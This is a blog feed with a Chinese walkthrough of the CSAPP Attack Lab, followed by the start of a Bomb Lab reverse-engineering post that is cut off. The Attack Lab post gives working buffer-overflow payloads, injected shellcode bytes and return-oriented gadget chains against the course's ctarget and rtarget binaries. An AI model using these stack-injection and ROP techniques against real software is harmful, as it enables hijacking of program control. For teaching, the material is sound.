&lt;h2 id=&quot;实验说明&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    <category term="CSAPP" scheme="https://lcjd99.github.io/categories/CSAPP/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP深入理解计算机系统 Lab3(attack Lab) 详解</title>
    <link href="https://lcjd99.github.io/Course/csapp/Lab3/"/>
    <id>https://lcjd99.github.io/Course/csapp/Lab3/</id>
    <published>2023-10-21T14:51:47.000Z</published>
    <updated>2024-04-12T15:34:46.881Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。</p></blockquote><h2 id="实验说明"><a class="markdownIt-Anchor" href="#实验说明"></a> 实验说明</h2><p>本实验通过向两个程序中进行攻击已达到攻击目的，通过这个实验能了解到通过缓冲区溢出的方法攻击程序的方法，同时对汇编代码、<code>GDB</code>和<code>OBJDUMP</code>等工具以及代码在机器中执行的过程的理解有更深的理解。</p><p>在动手实验之前需要仔细阅读<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">实验说明</a>, 本实验可以在实验说明的引导下顺利完成。</p><p>实验中主要包括两个可执行程序<code>ctarget</code>和<code>rtarget</code>，两个可执行程序都会从标准输入中读入一个字符串在缓冲区中，但是并不会检测是否会出现缓冲区溢出。但是程序会在反馈信息中表示是否出现缓冲区溢出。同时还有一个工具<code>HEX2RAW</code>，是为了方便我们将二进制代码(16进制表示方式)变成对应的ascii码串作为可执行程序的输入</p><p>其中有一些需要说明的重点：</p><ul><li>在企图植入的代码中不应该包含<code>0x0a</code>，因为这在ascii中代表换行符，而实验中是按行读取</li><li><code>HEX2RAW</code> 要按照小端序的方式写入，并且都要补齐两位。</li></ul><h3 id="一点小坑"><a class="markdownIt-Anchor" href="#一点小坑"></a> 一点小坑</h3><p>出现报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FAILED: Initialization error: Running on an illegal host</span><br></pre></td></tr></table></figure><p>由于我们无法连接到CMU的服务器，所以通常的执行方法会导致程序卡在等待服务器响应上，因此每次执行都需要带上<code>-q</code>的参数离线执行。</p><h2 id="实验具体流程"><a class="markdownIt-Anchor" href="#实验具体流程"></a> 实验具体流程</h2><h3 id="part1-level1-phase-1"><a class="markdownIt-Anchor" href="#part1-level1-phase-1"></a> Part1 Level1 (Phase 1)</h3><p>这是一个热身实验，目标是让程序执行到一个目标位置的函数<code>touch1</code>。对于本题的思路如下：</p><p>首先我们需要知道<code>touch1</code>的的地址便于我们写入栈中，可以通过<code>objdump -d &gt; source.S</code>的方式找到其位置(文本编辑器的查找),查找到如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 g     F .text  000000000000002c  touch1</span><br></pre></td></tr></table></figure><p>说明touch1的位置在<code>0x4017c0</code>的位置。我们的目标就是将这个地址放在栈记录函数返回值的地方，并在函数<code>getbuf</code>调用<code>ret</code>时进入这个部分代码。</p><p>然后我们需要知道<code>buffer</code>的大小，这里需要查看<code>getbuf</code>的代码，在Lab2中我主要通过阅读<code>objdump -t</code>的逆向汇编解题，这次我主要通过<code>gdb</code>来完成。我们执行<code>gdb ctarget</code>并直接<code>b getbuf</code>设置断点,然后<code>r -q</code>执行到断点位置。接着执行汇编如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">=&gt; 0x00000000004017a8 &lt;+0&gt;:sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:call   0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在这里能看到实际上分配的空间为<code>0x28B</code>。并且不会做缓冲区溢出的验证，我们可以先任意填充数据将缓存区填满，并在继续填写将返回值修改为<code>0x00000000004017c0</code>。但是需要注意的是小端序的存储方式，我们可以将数据以16进制的格式写入一个文本文件，便于  <code>HEX2RAW</code> 转换为我们需要的数据。我填写的数据在<code>key_1.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>使用如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user <span class="built_in">id</span>bovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:1</span><br></pre></td></tr></table></figure><h3 id="part1-level2-phase-2"><a class="markdownIt-Anchor" href="#part1-level2-phase-2"></a> Part1 Level2 (Phase 2)</h3><p>这个部分的可以看到汇编代码中有如下部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004017fc &lt;+16&gt;:    cmp    0x202ce2(%rip),%edi  # 0x6044e4 &lt;cookie&gt;</span><br></pre></td></tr></table></figure><p>直接给出了所需要比较的值<code>cookie</code>的位置，直接用gdb打印出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x 0x6044e4</span><br><span class="line">0x6044e4 &lt;cookie&gt;:      0x59b997fa</span><br></pre></td></tr></table></figure><p>现在的目标就变成如何将这个值写入到寄存器<code>rdi</code>中，根据提示信息我们不要使用除<code>ret</code>以外的其他跳转指令，所以就要借助栈即存储地址又存储指令。我们可以将将示意图表示如下</p><p><img src="https://pic4.zhimg.com/80/v2-217ebf4b5c8832f3762d154634397080.png" alt="Image" /></p><p>因为我们只能通过输入字符串的方式去攻击，所以我们能做的就是将函数返回地址改为栈中下一行的地址(这里的索引为示例，实际情况中栈的地址是向下增长的)，并将下一行作为注入函数的代码段，同时记得再将返回地址利用<code>mov</code>写入栈中，并将<code>rsp</code>寄存器移动到相应地方以利用<code>ret</code>进入<code>touch2</code>。</p><p>我的注入代码段如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">add $0x4, %rsp &quot; 通过后续代码长度计算需要加的长度,0x4是标记一下位置，方便找</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>将上述代码保存在<code>a.S</code>中，并执行用于生成二进制代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   48 83 c4 04             add    $0x4,%rsp</span><br><span class="line">   b:   c3                      ret</span><br></pre></td></tr></table></figure><p>这段代码中我们能看出我们需要将<code>rsp</code>移动<code>b + 1</code>也就是<code>c</code>，寻找<code>touch2</code>函数的地址方式见上一题，最终注入为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">a8 dc 61 55 00 00 00 00   //下一行的地址</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">48 83 c4 0c         </span><br><span class="line">c3</span><br><span class="line">ec 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_2.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2</span><br></pre></td></tr></table></figure><h3 id="part1-level3-phase-3"><a class="markdownIt-Anchor" href="#part1-level3-phase-3"></a> Part1 Level3 (Phase 3)</h3><p>本题和上一题的区别不大，仅仅是改为注入一个字符串指针作为参数，我们可以将字符串的值存在栈中，而将参数传回，具体操作过程如下</p><p><img src="https://pic4.zhimg.com/80/v2-6975107c9128a0bdfaa89c47fef8c7db.png" alt="Image" /></p><p>注入的代码段和上一题格式相同，需要修改的参数是<code>rdi</code>的值应该为上图栈中第5行的部分。</p><p>首先我们需要知道字符串的值如下，这里我们直接利用<code>gdb</code>，我们先像第一个题一样直接将返回地址设置为<code>touch3</code>，并在<code>touch3</code>处设置断点开始执行，并单步调试到<code>mov    0x202bd3(%rip),%edi</code>后直接通过<code>p/x $edi</code>打印出其值为<code>0x59b997fa</code>，我们知道<code>$rdi</code>和<code>$rsi</code>作为参数传递给函数<code>hexmatch</code>中，通过<code>disas hexmatch</code>可以发现，该函数实际上通过<code>__sprintf_chk</code>这个库函数将<code>$edi</code>的值格式化为字符串，具体格式为<code>&quot;%.8x&quot;</code>表示以16进制方式转换，也就是是说转换后的字符串为<code>&quot;59b997fa&quot;</code>，说明我们需要在上图6的位置添入的就是这个字符串，字符串序列为<code>35 39 62 39 39 37 66 61 00</code>注意字符串末尾的 <code>00</code></p><p>编写汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x22222222, %rsp</span><br><span class="line">mov $0x22222222, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>其中的数后续根据具体地址修改</p><p>编译并反汇编后得到如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c4 22 22 22 22    mov    $0x22222222,%rsp</span><br><span class="line">   7:   48 c7 c7 22 22 22 22    mov    $0x22222222,%rdi</span><br><span class="line">   e:   c3                      ret</span><br></pre></td></tr></table></figure><p>我们可以根据上述地址加以修改，<code>gdb</code>中断点在<code>getbuf</code>处查看栈指针位置为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> <span class="variable">$rsp</span></span><br><span class="line"><span class="variable">$3</span> = (void *) 0x5561dca0</span><br></pre></td></tr></table></figure><p>说明写入的位置在 <code>0x5561dca0 + 0x8 + 0xe = 0x5561dcb7</code> 和 <code>0x5561dcb7 + 0x8 = 0x5561dcbf</code>，这样就可以得出最终的代码二进制代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">a8 dc 61 55 00 00 00 00</span><br><span class="line">48 c7 c4 b7 dc 61 55</span><br><span class="line">48 c7 c7 bf dc 61 55</span><br><span class="line">c3</span><br><span class="line">fa 18 40 00 00 00 00 00 //touch3</span><br><span class="line">35 39 62 39 39 37 66 61 00 //string</span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3</span><br></pre></td></tr></table></figure><h3 id="part2-level2-phase-4"><a class="markdownIt-Anchor" href="#part2-level2-phase-4"></a> Part2 Level2 (Phase 4)</h3><p>在第二部分中程序进行了增强，具体如下：</p><ol><li>栈的地址进行了随机化，意味着无法再直接确定攻击的地址</li><li>内存中为栈分配的空间没有了执行权限，意味着无法注入代码段在栈中</li></ol><p>但是我们“小工具“可以通过其原有代码的部分代码段作为我们执行的二进制代码，从而产生我们需要的效果。<strong>这里的小工具实际上是一个函数的最后部分，执行这个片断的代码并返回栈中，继续<code>ret</code>到栈中下一行所指向的代码,由于在此其间并没有call过这个函数，栈中的数据并不会被破坏修改，从而能按照栈中的地址一步步执行</strong>。</p><p>在这个部分我们需要在这个限制条件下重新入侵到<code>Phase 2</code>函数中，并给予限制如下：</p><ol><li>解决方案需要使用小工具的方式实现</li><li>只能使用到前八个寄存器</li><li>限制使用的指令为<code>movq popq ret nop</code></li></ol><p>实际上看上去是一些限制其实也是一些提示，帮助我们减少检索指令的范围。同时所有可能用到的指令都作为附件放在文档的最后，大家做的时候应该仔细查阅。</p><p><strong>接下来开始实验的过程</strong></p><p>首先将汇编代码保存本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d rtarget &gt; rtarget.S</span><br></pre></td></tr></table></figure><p>按照要求找到<code>start_farm</code> 和 <code>mid_farm</code>之间的汇编代码。根据需求，我们需要修改<code>%rdi</code>寄存器的值，并将执行的<code>PC</code>跳转到<code>touch2</code>函数的位置。首先查看cookie的值（方法同<code>Phase 2</code>）为<code>0x59b997fa</code> 。现在需要将这个值放入栈中并在小工具中将<code>popq</code>到某个寄存器中，在执行寄存器<code>movq</code>指令即可。</p><p>观察工具代码部分有如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   ret</span><br></pre></td></tr></table></figure><p>这里最后的<code>58 90 c3</code> 分别对应三个指令<code>popq %rax</code> 、<code>nop</code> 、<code>ret</code>，所以我们可以在栈中存放同上面的值<code>0x59b997fa</code> 将其移动到<code>%rax</code>中。</p><p>接下来我们抱着目的性的找<code>movq %rax %rdi</code> , 也就是<code>48 89 c7</code>观察以下函数满足规则发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   ret</span><br></pre></td></tr></table></figure><p>因此这个栈中的代码放置应该如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1: 0x00000000004019ab   //addr &lt;addval_219&gt; + 4</span><br><span class="line">2: 0x0000000059b997fa//需要的值用于popq</span><br><span class="line">3: 0x00000000004019c5 //addr &lt;setval_426&gt; + 2</span><br><span class="line">4: 0x00000000004017ec //addr &lt;touch2&gt;</span><br></pre></td></tr></table></figure><p>转换为二进制代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>最终执行结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_4.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2</span><br></pre></td></tr></table></figure><h3 id="part2-level3-phase-5"><a class="markdownIt-Anchor" href="#part2-level3-phase-5"></a> Part2 Level3 (Phase 5)</h3><p>这个部分就完全如法炮制的执行到<code>Phase 3</code>即可。通过上一题知道，其实执行到<code>touch</code>部分应该是和<code>ctarget</code>共用的代码段，所以可以直接认为需要的字符串参数为<code>0x59b997fa</code>即可。</p><p>但是当栈的位置不可知时只能利用<code>%rsp</code>指针的相对值，意味着我们需要计算出偏移量，对于这道题中如何加偏移量是重点。文档中其实没有给出任何执行运算的二进制代码，因此我们需要自己找。通过查找发现并没有<code>add</code>指令的操作码<code>83</code>，但是有<code>lea</code> 的函数如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   ret</span><br></pre></td></tr></table></figure><p>所以根据提供的函数，我们可以大致写出以下思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">(偏移量)</span><br><span class="line">movl %eax, %edx</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">movq %rsp, %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">lea (%rdi, %rsi, 1), %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">touch3</span><br><span class="line">string</span><br></pre></td></tr></table></figure><p>偏移量为取出<code>%rsp</code>的值到<code>string</code>的距离，为<code>8 * 4 = 32B</code> 也就是<code>0x20</code></p><p>如上图的思路可以转换为二进制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">dd 19 40 00 00 00 00 00 /* movl %eax, %edx */</span><br><span class="line">69 1a 40 00 00 00 00 00 /* movl %edx, %ecx */</span><br><span class="line">27 1a 40 00 00 00 00 00 /* movl %ecx, %esi */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* movq %rax, %rdi  */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 00 /* string */</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_5.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3</span><br></pre></td></tr></table></figure><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>这个实验总体来说难度不大，但是很有趣味性，通过对栈溢出的攻击，让我们明白程序检测栈是否溢出的重要性。（不过到最后一题才看到<code>hex2raw</code>支持注释，对实验的便捷性还是提供一定帮助。）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;实验说明&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    <category term="CSAPP" scheme="https://lcjd99.github.io/categories/CSAPP/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP深入理解计算机系统 Lab2(bomb Lab) 详解</title>
    <link href="https://lcjd99.github.io/Course/csapp/Lab2/"/>
    <id>https://lcjd99.github.io/Course/csapp/Lab2/</id>
    <published>2023-10-15T14:51:47.000Z</published>
    <updated>2024-04-12T15:34:10.862Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。</p></blockquote><h2 id="实验说明"><a class="markdownIt-Anchor" href="#实验说明"></a> 实验说明</h2><p>本实验通过逆向的方式模拟拆炸弹的过程，炸弹共有6道锁，我们需要逐一破解每一道锁，最终拆除炸弹。我们可以通过执行<code>./bomb</code>开始输入密码，也可以把密码输入到任意文件中作为参数传递给<code>./bomb</code>，例如<code>./bomb passwords.txt</code></p><p>在动手实验之前需要仔细阅读<a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf">实验说明</a>, 其中重点阅读<strong>Hints</strong>的章节，这里提供一些提示</p><ol><li><strong>gdb</strong>, gdb是一个命令行调试器，我们可以用gdb查看程序的汇编并且轻易的查看内存。这里有一个CMU的简明<a href="https://www.cs.cmu.edu/~gilpin/tutorial/">gdb使用教程</a>，</li><li><strong>objdump -t</strong> ，这个命令可以打印出炸弹的符号表，符号表会打印出所有函数名和函数地址。我们可以对程序的整体有一个直观的认识，同时快速定位到函数的位置。</li><li><strong>objdump -d</strong> ，这个命令会直接打印出整个程序的汇编指令</li><li><strong>prints</strong> 这个命令会打印出可打印的字符串。</li></ol><p>还有一些工具能够提供官方文档：</p><ol><li><code>apropos</code>，能够检索并列出本地相关关键词的文档</li><li><code>man</code>，能够提供相应的官方文档，使用<code>man ascii</code>能方便获取到各个字符的ascii码</li></ol><blockquote><p>声明：本文后续转换的代码并被严格的C代码，而是描述思路的伪代码，并没有严格区分指针和值等的表述关系</p></blockquote><h2 id="实验具体流程"><a class="markdownIt-Anchor" href="#实验具体流程"></a> 实验具体流程</h2><h3 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h3><p>实验提供一个c版本的框架可以让我们快速了解程序的框架，我们看到整个程序中的六个函数是<code>phase_&#123;1..6&#125;</code>，如果输入字符正确则会拆除炸弹。</p><h4 id="1-逆向产生汇编代码并保存"><a class="markdownIt-Anchor" href="#1-逆向产生汇编代码并保存"></a> 1. 逆向产生汇编代码并保存</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d &gt; source.S</span><br></pre></td></tr></table></figure><p>对于这个项目，我们需要关注其<code>.text</code>字段，为了方便我们可以删除其他字段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -t bomb &gt; table.txt</span><br></pre></td></tr></table></figure><p>这里对其做一些解释。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ac0ld.init  0000000000000000.init</span><br><span class="line">0000000000000000ldf*ABS*  0000000000000000bomb.c</span><br></pre></td></tr></table></figure><p>根据其manual中的解释</p><blockquote><p>Here the first number is the symbol’s value (sometimes referred to as its address).  The next field is actually a set of characters and spaces indicating the flag bits that are set on the symbol.  These characters are described below.  Next is the section with which the symbol is associated or <em>ABS</em> if the section is absolute (ie not connected with any section), or <em>UND</em> if the section is referenced in the file being dumped, but not defined there. After the section name comes another field, a number, which for common symbols is the alignment and for other symbol is the size.Finally the symbol’s name is displayed.</p></blockquote><ol><li>第一列是标识符的地址或者值。</li><li>第二列是一个标记位，具体标记规则见其manual文档，这里给出几个常见的标记 :<code>l</code>代表本地，<code>g</code>代表全局，<code>f</code>代表文件，<code>F</code>代表函数，<code>O</code>代表对象。</li><li>第三列是标识符对应的段，其中<code>*ABS*</code>代表绝对的位置，<code>UND</code>代表没有定义在当前程序中。</li><li>地四列是对齐方式或变量大小</li><li>最后是标记符名</li></ol><h4 id="2使用strings获取"><a class="markdownIt-Anchor" href="#2使用strings获取"></a> 2.使用strings获取</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings bomb 